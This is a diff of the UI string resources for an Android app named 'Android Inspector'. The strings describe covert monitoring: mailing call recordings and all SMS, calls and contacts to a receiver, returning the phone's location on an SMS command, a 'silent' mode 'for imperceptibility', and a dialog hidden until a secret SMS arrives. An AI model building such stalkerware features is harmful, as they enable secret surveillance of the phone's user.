@@ -46,9 +46,12 @@
     <string name="mail_body_record">Hi,this is an auto mail from %s with phone call recording attached.</string>
     
     <!-- Location -->
-    <string name="location_sms_real">Current GPS location(latitude, longitude): %s, see it on maps.google.com. Accuracy error is less than 10m.</string>
-    <string name="location_sms_base_station">Current base station location(latitude, longitude): %s, see it on maps.google.com. Accuracy error 50~500m.</string>
-    <string name="location_sms_hist">Cannot get current location. The latest historical location(datetime, latitude, longitude): %s, see it on maps.google.com</string>
+    <string name="location_sms_gps_real">Current GPS location(latitude, longitude): %s, see it on maps.google.com</string>
+    <string name="location_sms_gps_hist">Latest GPS location(latitude, longitude): %s, see it on maps.google.com</string>
+    <string name="location_sms_network_real">Current network location(latitude, longitude): %s, see it on maps.google.com</string>
+    <string name="location_sms_network_hist">Latest network location(latitude, longitude): %s, see it on maps.google.com</string>
+    <string name="location_sms_base_station_gsm">Current base station location: %s, see it on maps.google.com</string>
+    <string name="location_sms_base_station_cdma">Current base station location(latitude, longitude): %s, see it on maps.google.com</string>
     <string name="location_sms_fail">Sorry, cannot get location now. Please try again later. Contact supporter if it always fails.</string>
     
     <!-- Preferences -->
@@ -89,7 +92,7 @@
     <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
     <string name="pref_sensitive_words_count_reach_max">No more than %d sensitive words, the surplus words will be ignored. Please re-edit your sensitive words.</string>
     <string name="pref_gps_word_title">Location Command</string>
-    <string name="pref_gps_word_summary">Send SMS(#dw) and then get back location.</string>
+    <string name="pref_gps_word_summary">Send SMS(#dw) and then get back its location.</string>
     <string name="pref_category_network_mode_title">Network</string>
     <string name="pref_network_mode_title">Network Connect Mode</string>
     <string name="pref_network_mode_summary">Suggest to keep the default "silent" mode for imperceptibility.</string>
@@ -98,16 +101,21 @@
     <string name="pref_must_use_self_sender">For protecting your privacy, recording all phone calls is permitted ONLY when using your own GMail sender.</string>
     
     <!-- InitActivity -->
-    <string name="init_btn_getinfo">Get Info</string>
+    <string name="init_btn_testrecvmail">Test Mail</string>
+    <string name="init_btn_testrecvphone">Test Phone</string>
     <string name="init_btn_screenshot">Screenshot</string>
     <string name="init_btn_setting">Setting</string>
     <string name="init_btn_hide">Exit</string>
-    <string name="init_hint_getinfo">Get all phonecall, SMS, contact information of this mobile phone, and send them to mail box.</string>
+    <string name="init_hint_testmail">Get all phonecalls, SMS, contacts and send to receiver mailbox.</string>
+    <string name="init_hint_testphone">Send a SMS to receiver phone.</string>
+    <string name="init_test_sms_content">A test SMS from Android Inspector.</string>
+	<string name="init_send_test_sms_ok">Sent Successfully</string>
+	<string name="init_send_test_sms_ng">Failed. Please check the receiver phone number and the mobile signal.</string>
     <string name="init_hint_screenshot">Get a screenshot and send a mail</string>
-    <string name="init_hint_setting">Set mail address, interval, mobile phone number, sensitive words, GPS activation word.</string>
-    <string name="init_hint_hide">Exit current setting dialog. This dialog can be triggered only by sending a SMS (the content is the key) to this mobile phone.</string>
+    <string name="init_hint_setting">Set mail address, phone number, sensitive words and etc.</string>
+    <string name="init_hint_hide">This dialog can be triggered again by sending ### SMS.</string>
     <string name="init_processing">Processing...</string>
-    <string name="init_waiting">Please wait a while...</string>
+    <string name="init_waiting">Collecting and Sending...</string>
     
     <!-- Actions -->
     <string name="action_send_mail_success">Sent a mail to your mail box successfully</string>
